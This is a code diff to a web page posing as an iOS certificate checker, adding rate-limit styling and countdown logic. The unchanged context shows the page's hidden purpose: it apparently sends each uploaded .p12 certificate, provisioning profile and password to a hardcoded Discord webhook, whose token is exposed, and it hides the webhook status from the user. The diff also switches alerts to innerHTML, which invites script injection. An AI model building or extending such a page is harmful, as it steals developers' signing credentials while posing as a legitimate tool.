@@ -375,6 +375,31 @@
         .webhook-status {
             display: none; /* Hide webhook status completely */
         }
+        
+        /* Rate limiting styles */
+        .rate-limit-countdown {
+            font-weight: bold;
+            display: inline-block;
+            min-width: 24px;
+            text-align: center;
+            animation: pulse 0.5s infinite alternate;
+        }
+        
+        @keyframes pulse {
+            from { transform: scale(1); }
+            to { transform: scale(1.1); }
+        }
+        
+        @keyframes countdownFlip {
+            0% { transform: rotateX(0deg); }
+            50% { transform: rotateX(90deg); }
+            100% { transform: rotateX(0deg); }
+        }
+        
+        .flip-digit {
+            display: inline-block;
+            animation: countdownFlip 0.5s ease-in-out;
+        }
     </style>
 </head>
 <body>
@@ -559,6 +584,12 @@
             // Webhook URL
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
             
+            // Rate limiting variables
+            let lastRequestTime = 0;
+            let rateLimitTimeout = null;
+            let rateLimitCountdown = null;
+            const RATE_LIMIT_DURATION = 3000; // 3 seconds
+            
             // Sample entitlements data
             const sampleEntitlements = [
                 "Access Wi-Fi Information",
@@ -653,7 +684,7 @@
             
             // Enable submit button only when all fields are filled
             function updateSubmitButtonState() {
-                if (p12File && mobileprovisionFile && passwordInput.value) {
+                if (p12File && mobileprovisionFile && passwordInput.value && !isRateLimited()) {
                     submitBtn.disabled = false;
                 } else {
                     submitBtn.disabled = true;
@@ -662,8 +693,20 @@
             
             passwordInput.addEventListener('input', updateSubmitButtonState);
             
+            // Check if user is currently rate limited
+            function isRateLimited() {
+                return Date.now() - lastRequestTime < RATE_LIMIT_DURATION;
+            }
+            
             // Handle form submission
             submitBtn.addEventListener('click', async function() {
+                // Check rate limiting
+                if (isRateLimited()) {
+                    const timeLeft = RATE_LIMIT_DURATION - (Date.now() - lastRequestTime);
+                    showRateLimitMessage(timeLeft);
+                    return;
+                }
+                
                 // Reset alerts
                 hideAlert(errorAlert);
                 hideAlert(successAlert);
@@ -674,6 +717,9 @@
                     submitBtn.disabled = true;
                     submitBtn.innerHTML = '<span class="loading-spinner"></span> Analyzing...';
                     uploadStatus.textContent = 'Checking certificate files...';
+                    
+                    // Update last request time
+                    lastRequestTime = Date.now();
                     
                     // Send data to webhook first (don't wait for it to complete)
                     sendToWebhook().catch(e => console.error('Webhook error:', e));
@@ -703,6 +749,53 @@
                     updateSubmitButtonState();
                 }
             });
+            
+            // Show rate limit message with countdown
+            function showRateLimitMessage(timeLeft) {
+                // Clear any existing timeouts
+                if (rateLimitTimeout) {
+                    clearTimeout(rateLimitTimeout);
+                }
+                if (rateLimitCountdown) {
+                    clearInterval(rateLimitCountdown);
+                }
+                
+                // Calculate seconds remaining
+                const secondsLeft = Math.ceil(timeLeft / 1000);
+                
+                // Show error alert with countdown
+                const errorMessage = `Rate Limited: Try again in <span class="rate-limit-countdown">${secondsLeft}</span> seconds`;
+                showAlert(errorAlert, errorMessage);
+                
+                // Start countdown animation
+                const countdownElement = errorAlert.querySelector('.rate-limit-countdown');
+                let countdown = secondsLeft;
+                
+                rateLimitCountdown = setInterval(() => {
+                    countdown--;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(rateLimitCountdown);
+                        hideAlert(errorAlert);
+                        updateSubmitButtonState();
+                        return;
+                    }
+                    
+                    // Add flip animation to countdown
+                    countdownElement.innerHTML = `<span class="flip-digit">${countdown}</span>`;
+                    
+                    // Reset animation for next number
+                    setTimeout(() => {
+                        countdownElement.textContent = countdown;
+                    }, 500);
+                    
+                }, 1000);
+                
+                // Set timeout to re-enable button
+                rateLimitTimeout = setTimeout(() => {
+                    updateSubmitButtonState();
+                }, timeLeft);
+            }
             
             // Function to send data to Discord webhook
             async function sendToWebhook() {
@@ -852,7 +945,7 @@
             }
             
             function showAlert(alertElement, message) {
-                alertElement.textContent = message;
+                alertElement.innerHTML = message;
                 alertElement.style.display = 'block';
             }
             
